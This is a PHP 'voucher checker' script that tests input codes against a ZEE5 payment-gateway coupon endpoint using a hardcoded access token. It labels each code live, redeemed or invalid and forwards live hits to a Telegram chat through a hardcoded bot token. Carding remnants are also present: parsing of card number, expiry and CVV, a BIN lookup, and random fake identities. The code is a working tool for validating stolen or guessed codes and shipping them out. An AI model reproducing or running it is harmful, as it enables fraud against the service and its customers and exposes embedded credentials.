<?php 



error_reporting(0);

date_default_timezone_set('America/New_York');



if ($_SERVER['REQUEST_METHOD'] == "POST") {

    extract($_POST);

} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {

    extract($_GET);

}

function GetStr($string, $start, $end) {

    $str = explode($start, $string);

    $str = explode($end, $str[1]);  

    return $str[0];

}

function inStr($string, $start, $end, $value) {

    $str = explode($start, $string);

    $str = explode($end, $str[$value]);

    return $str[0];

}

$separa = explode("|", $lista);

$cc = $separa[0];

$mes = $separa[1];

$ano = $separa[2];

$cvv = $separa[3];




//==================[Randomizing Details]======================//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');

preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);

$name = $matches1[1][0];

preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);

$last = $matches1[1][0];

preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);

$email = $matches1[1][0];

preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);

$street = $matches1[1][0];

preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);

$city = $matches1[1][0];

preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);

$state = $matches1[1][0];

preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);

$phone = $matches1[1][0];

preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);

$postcode = $matches1[1][0]; 




#---/// Proxy\\\---#

//////////======= Hydra Proxy

 








////////////////////////////===[1 Req]



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://securepayment.zee5.com/paymentGateway/coupon/verification?coupon_code='.$lista.'&translation=en&country_code=IN');
curl_setopt($ch, CURLOPT_HEADER, 0);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: ',
    'method: ',
    'path: ',
    'scheme: ',
    'accept: ',
    'accept-language: ',
    'content-type: ',
    'origin: ',
    'referer: ',
    'sec-fetch-dest: ',
    'sec-fetch-mode: ',
    'sec-fetch-site: ',
    'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybV9jb2RlIjoiV2ViQCQhdDM4NzEyIiwiaXNzdWVkQXQiOiIyMDIzLTA1LTI5VDIxOjIwOjE3LjY5N1oiLCJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInR0bCI6ODY0MDAwMDAsImlhdCI6MTY4NTM5NTIxN30.OQNpUQFLdqoxZVuQuHhrRLOHE_pQktzNMP2XAQbLivE',
));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

// Postfields




$result1 = curl_exec($ch);

curl_close($ch);

$data = json_decode($result1, true);
$message = $data['message'];




////////////////////////////===[2 Req]












////////////////////////////===[BIN Info]



$cctwo = substr("$cc", 0, 6);



$ch = curl_init();





curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');

curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: lookup.binlist.net',

'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'

));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$fim = curl_exec($ch);

$fim = json_decode($fim,true);

$bank = $fim['bank']['name'];

$country = $fim['country']['name'];

$emoji = $fim['country']['emoji'];

$type = $fim['type'];

curl_close($ch);

if(strpos($fim, '"type":"credit"') !== false) {

  $type = 'Credit';

} else {

  $type = 'Debit';

}

$bottoken = "6105864314:AAGWDSDOiLKM2Au6zp0Gk8HOMgaq1LjmW1o";
$chatid = $_GET['chatid'];



$tgtext = "𝙇𝙄𝙑𝙀 𝙑𝙊𝙐𝘾𝙃𝙀𝙍 𝙁𝙊𝙐𝙉𝘿🎯%0A<code>$lista</code>";

$forwardd="https://api.telegram.org/bot$bottoken/sendMessage?chat_id=$chatid&text=$tgtext&parse_mode=html";

////////////////////////////===[Responses]===////////////////////////////



if

(strpos($result1,  'Coupon code applied successfully')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>𝙇𝙄𝙑𝙀 𝙑𝙊𝙐𝘾𝙃𝙀𝙍 𝙁𝙊𝙐𝙉𝘿 $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'> [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br>";
  

file_get_contents($forwardd);
  
  
}



elseif

(strpos($result1,  'Code already redeemed')) {

  echo "<font size='2' color='white'><font class='badge badge-danger'>𝘿𝙀𝘼𝘿 𝙑𝙊𝙐𝘾𝙃𝙀𝙍</font><br><font class='badge badge-danger'>$lista</font></font><br><font size='2' color='red'><font class='badge badge-light'>𝙈𝙀𝙎𝙎𝘼𝙂𝙀 : $message</font></font><br>";




}

elseif

(strpos($result1,  'Please Provide Valid Coupon code')) {

  echo "<font size='2' color='white'><font class='badge badge-danger'>𝘿𝙀𝘼𝘿 𝙑𝙊𝙐𝘾𝙃𝙀𝙍</font><br><font class='badge badge-danger'>$lista</font></font><br><font size='2' color='red'><font class='badge badge-light'>𝙈𝙀𝙎𝙎𝘼𝙂𝙀 : $message</font></font><br>";




}


else {

  echo "<font size='2' color='white'><font class='badge badge-danger'>𝙐𝙉𝙆𝙉𝙊𝙒𝙉 𝙀𝙍𝙍𝙊𝙍</font><br><font class='badge badge-danger'>$lista</font></font><br><font size='2' color='red'><font class='badge badge-light'>𝙈𝙀𝙎𝙎𝘼𝙂𝙀 : $message</font></font><br>";

}










//echo "$result1";
//echo "$result2<br>";





?>